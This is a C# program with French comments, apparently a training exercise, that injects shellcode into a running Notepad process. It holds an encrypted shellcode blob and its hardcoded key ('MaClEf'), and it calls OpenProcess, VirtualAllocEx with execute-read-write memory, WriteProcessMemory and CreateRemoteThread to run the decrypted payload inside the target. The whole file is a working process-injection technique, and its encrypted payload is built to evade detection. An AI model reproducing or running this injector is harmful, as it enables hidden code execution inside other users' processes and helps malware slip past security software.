using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ex03
{
    class Program
    {
        private const string SecretKey = "MaClEf";

        // Importation des fonctions depuis kernel32.dll

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             ProcessAccessFlags processAccess,
             bool bInheritHandle,
             int processId
        );

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        static void Main(string[] args)
        {
            string shellCodeEncrypted = "sSnCiLWZsp6roEVmTSASLRU0HDcLXZcDBeoRDA3tH3kL5xdGAFCKJM4UHSlM2w8sBVCDwHkHMWNvTASnhGwCbYSEoDML5xdGDDDILnkuTLEl7T1+RmNM6TdmTWHI7M1mTWEL6YUSKilCvAHtDUHIJF02BGCTjxMusqgC53HuBWCVIXSvBVCDwASnhGwCbYRerRSyIEYqaWkGVZQTlTkH5wVCBGCTCgTtQSkH5wV6BGCTLc5ixSlCvAQ+DDkdNR8nFSAaLR8uzo1jLReZrTkCNR8uxnOqJ7qZsjyrZ0VmTRQwCTdVf08nAClmFCD5IDJASp6WJYKnTWFDbK18TWFDOCQVJkElDSwKKAVjHzAFLgQwHyMTIQ06TUU8pWZDbEUjPxMsHmRmDDkLXYwn9yTAOkKZmClypQTcvdThOrqz";

            // On récupère les process cibles actifs qui s'appellent "notepad"
            Process[] processes = Process.GetProcessesByName("notepad");

            if (processes.Length == 0)
            {
                Console.WriteLine("Process cible non actif !");
                return;
            }

            // On récupère le premier process trouvé
            Process targetProcess = processes[0];

            // On ouvre le process pour obtenir un "Handle"
            IntPtr handleProcess = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);

            // On déchiffre le shellCode encrypté pour pouvoir l'utiliser
            byte[] shellCodeDecrypted = Decryption.Decrypt(shellCodeEncrypted, SecretKey);

            // On réserve un espace mèmoire dans le process cible 
            IntPtr adresseMemoire = VirtualAllocEx(handleProcess, IntPtr.Zero, (uint)shellCodeDecrypted.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

            // On injecte notre shellCode dans l'espace mémoire réservé
            UIntPtr bytesWritten;
            WriteProcessMemory(handleProcess, adresseMemoire, shellCodeDecrypted, (uint)shellCodeDecrypted.Length, out bytesWritten);

            // On crée le thread qui va actionner notre shellCode dans le process cible
            IntPtr handleThread = CreateRemoteThread(handleProcess, IntPtr.Zero, 0, adresseMemoire, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}